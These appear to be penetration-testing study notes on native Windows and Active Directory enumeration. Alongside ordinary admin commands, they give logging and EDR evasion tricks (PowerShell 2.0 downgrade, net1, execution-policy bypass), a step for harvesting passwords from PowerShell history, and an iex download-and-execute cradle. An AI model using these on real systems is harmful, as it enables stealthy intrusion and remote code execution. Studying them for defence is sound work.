# Living Off the Land: Native Windows Enumeration

**Living Off the Land (LotL)** utilizes native Windows and Active Directory tools to perform enumeration.

**When to use:**

- The target host has **no internet access**, preventing the download of external tools.
- **Tool-loading fails** due to security controls.
- A **stealthy approach** is required to avoid detection by IDS/IPS, EDR, or network monitoring tools that flag anomalous traffic.

---

## Initial Host & Network Reconnaissance

Establishing a baseline of the system provides initial networking and domain information while minimizing the footprint.

### Basic Enumeration Commands

|Command|Result|
|:--|:--|
|`hostname`|Prints the PC's Name.|
|`[System.Environment]::OSVersion.Version`|Prints OS version and revision level.|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Lists applied patches and hotfixes.|
|`ipconfig /all`|Displays network adapter state and configurations.|
|`set`|Displays environment variables (CMD).|
|`echo %USERDOMAIN%`|Displays the host's domain name (CMD).|
|`echo %logonserver%`|Prints the name of the authenticating Domain Controller (CMD).|

**Operational Tip**: Running `systeminfo` provides a summary of all the above in one output.

- **Why it matters**: Generating a single summary **generates fewer logs** than running multiple individual commands, reducing the chance of detection.

### User Session Discovery

Check for other active users before executing intrusive actions to remain undetected.

- **Why it matters**: Launching popups or logging out another user can lead to the user reporting suspicious activity or changing their password, causing a **loss of foothold**.
- **Command**: `qwinsta`.

---

## PowerShell Enumeration & OPSEC

PowerShell allows for deep system and AD reconnaissance but is heavily monitored in modern environments.

### PowerShell Operational Commands

|Cmdlet|Goal|
|:--|:--|
|`Get-Module`|Lists available loaded modules.|
|`Get-ExecutionPolicy -List`|Prints execution policy settings for each scope.|
|`Set-ExecutionPolicy Bypass -Scope Process`|Temporarily bypasses execution policy for the **current process only**; reverts upon termination.|
|`Get-ChildItem Env: \|ft Key,Value`|
|`Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`|Retrieves history; may contain **passwords** or paths to sensitive scripts.|
|`powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('<URL>'); <COMMANDS>"`|Downloads and executes a file directly from memory.|

### Technique: PowerShell Downgrade

**PowerShell Event Logging** and **Script Block Logging** were introduced in version 3.0. Actions in version 2.0 are not recorded in these logs.

1. **Check current version**: `Get-host`.
2. **Execute downgrade**: `powershell.exe -version 2`.
3. **Verify state**: Confirm version is 2.0; subsequent actions are now **masked from logging**.

- **Edge Case**: The command to initiate the downgrade is logged. A **vigilant defender** may investigate if logs suddenly stop after this command.

---

## Host Defense Enumeration

Identify active security measures to plan evasion or reporting.

|Action|Command|
|:--|:--|
|**Check Firewall Profiles**|`netsh advfirewall show allprofiles`.|
|**Check Defender Status (CMD)**|`sc query windefend`.|
|**Detailed AV Config (PS)**|`Get-MpComputerStatus`.|

**Decision Point**: Use `Get-MpComputerStatus` to identify scan schedules and whether **on-demand threat alerting** is active.

---

## Network Discovery & Lateral Movement

Identify potential pivot points and network segments without active scanning.

1. **View ARP Table**: Identify hosts the system has communicated with.
    
    ```
    arp -a
    ```
    
2. **View Routing Table**: Identify known networks and layer three routes.
    
    ```
    route print
    ```
    

- **Attack Implication**: Routes in the table indicate frequently accessed resources or administratively defined segments available for **lateral movement**.

---

## WMI & Net Commands

### Windows Management Instrumentation (WMI)

WMI retrieves administrative information from local and remote hosts.

|Command|Goal|
|:--|:--|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Check patch levels.|
|`wmic computersystem get Name,Domain,Username,Roles /format:List`|View basic host attributes.|
|`wmic process list /format:list`|List all running processes.|
|`wmic ntdomain list /format:list`|View Domain and Domain Controller info.|
|`wmic useraccount list /format:list`|List accounts that have logged in.|
|`wmic group list /format:list`|List local groups.|
|`wmic sysaccount list /format:list`|Identify system accounts used for services.|

### Net Commands & EDR Evasion

`net.exe` commands are heavily monitored by EDR and can trigger alerts when run by non-admin users (e.g., a "Marketing" account running `net localgroup administrators`).

- **Technique**: Use `net1` instead of `net`.
- **Why it matters**: `net1` executes the same functions but may bypass simple **string-based triggers** for `net`.

|Query|Command|
|:--|:--|
|**Password Policy**|`net accounts /domain`.|
|**Domain Groups**|`net group /domain`.|
|**Domain Admins**|`net group "Domain Admins" /domain`.|
|**Specific User Info**|`net user <USERNAME> /domain`.|
|**Local Admins**|`net localgroup administrators /domain`.|
|**Active Shares**|`net share`.|

---

## Active Directory Discovery (Dsquery)

`dsquery` is a native tool used to find AD objects. It requires **elevated privileges** or a **SYSTEM context**.

- **Location**: `C:\Windows\System32\dsquery.dll`.

### LDAP Filtering with OIDs

LDAP queries use **Object Identifiers (OIDs)** to match bit values in attributes like `userAccountControl` (UAC).

|OID Rule|Description|
|:--|:--|
|`1.2.840.113556.1.4.803`|**LDAP_MATCHING_RULE_BIT_AND**: Bit value must match completely.|
|`1.2.840.113556.1.4.804`|**LDAP_MATCHING_RULE_BIT_OR**: Matches if any bit in the chain matches.|

### Operational Workflows

- **Find all computers**: `dsquery computer`.
- **Wildcard OU search**: `dsquery * "CN=Users,DC=<DOMAIN>,DC=<LOCAL>"`.
- **Find Domain Controllers (UAC bit 8192)**:
    
    ```
    dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
    ```
    

### Dangerous/Misconfigured AD Settings

|Setting|LDAP Filter Criteria|Attack Implication|
|:--|:--|:--|
|**Password Not Required**|`(userAccountControl:1.2.840.113556.1.4.803:=32)`|Simplifies account compromise.|
|**Password Can't Change**|`(userAccountControl:1.2.840.113556.1.4.803:=64)`|Prevents user from remediating compromised credentials.|